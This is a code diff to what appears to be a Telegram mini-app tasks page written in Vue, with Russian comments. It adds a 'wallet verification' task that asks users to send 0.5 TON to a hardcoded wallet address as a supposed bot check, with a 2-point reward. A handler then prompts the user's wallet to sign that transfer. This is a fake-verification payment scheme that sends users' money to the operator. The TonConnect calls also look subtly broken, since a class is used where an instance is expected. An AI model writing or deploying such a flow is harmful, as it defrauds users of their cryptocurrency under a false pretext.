@@ -3,12 +3,13 @@ import { ref } from 'vue'
 import BottomNav from '@/components/BottomNav.vue'
 import InviteModal from '@/components/InviteModal.vue'
 
+import { TonConnectUI } from '@tonconnect/ui'
+
 import icox from '@/assets/iconx.svg'
 import iconds from '@/assets/iconds.svg'
 import icontg from '@/assets/iconTG.png'
 import iconton from '@/assets/iconTON.png'
 
-// 1. Описываем интерфейс для нашего задания, чтобы TypeScript помогал с подсказками
 interface Task {
     id: number;
     name: string;
@@ -16,16 +17,17 @@ interface Task {
     description: string;
     link: string;
     reward: number;
+    address?: string;
 }
 
-// 2. Добавляем данные в массив
 const friends = ref<Task[]>([
     { 
         id: 1, 
         name: 'Верификация кошелька', 
         avatar: iconton, 
-        description: 'Для подтверждения активности аккаунта совершите тестовый перевод 0.5 TON на указанный адрес смарт-контракта. Это защитит систему от наплыва ботов.',
+        description: 'Для подтверждения активности аккаунта совершите тестовый перевод 0.5 TON на указанный адрес.',
         link: 'verification', 
+        address: 'UQCk6aQqhFNLfatGk3fCKkB79IB0yeiSZg9yfBvtETARiGA6',
         reward: 2
     },
     { 
@@ -65,13 +67,49 @@ const closeTaskModal = () => {
 }
 
 // 4. Функция для открытия ссылки из задания
-const handleGoToLink = () => {
+const handleGoToLink = async () => {
     if (!selectedTask.value?.link) return;
 
-    const url = selectedTask.value.link;
+    if (selectedTask.value.link === 'verification') {
+        if (!TonConnectUI?.connected) {
+            alert('Сначала подключите кошелек на главной странице!');
+            return;
+        }
 
-    if ((window as any).Telegram && (window as any).Telegram.WebApp) {
-        const tg = (window as any).Telegram.WebApp;
+        // Проверяем, указан ли адрес получателя в задании
+        if (!selectedTask.value.address) {
+            alert('Адрес кошелька для верификации не настроен.');
+            return;
+        }
+
+        try {
+            // Формируем транзакцию
+            const transaction = {
+                validUntil: Math.floor(Date.now() / 1000) + 360, // Транзакция действительна 6 минут
+                messages: [
+                    {
+                        address: selectedTask.value.address, // 👈 Автоматически подставит твой адрес из массива выше!
+                        amount: "500000000" // 0.5 TON в нанотонах (соотношение 1 TON = 1 000 000 000 нанотонов)
+                    }
+                ]
+            }
+
+            // Вызываем окно подтверждения оплаты в кошельке пользователя (Tonkeeper / Wallet в ТГ)
+            await TonConnectUI.sendTransaction(transaction);
+            
+            alert('Транзакция отправлена в сеть! Нажмите "Проверить" через минуту.');
+            
+        } catch (e) {
+            // Если пользователь нажал "Отмена" внутри кошелька
+            console.error('Пользователь отменил транзакцию или произошла ошибка:', e);
+        }
+        return;
+    }
+
+    // --- ОБЫЧНЫЕ ССЫЛКИ (Twitter, Telegram, Discord) ---
+    const url = selectedTask.value.link;
+    if (window.Telegram && window.Telegram.WebApp) {
+        const tg = window.Telegram.WebApp;
         if (url.includes('t.me')) {
             tg.openTelegramLink(url);
         } else {
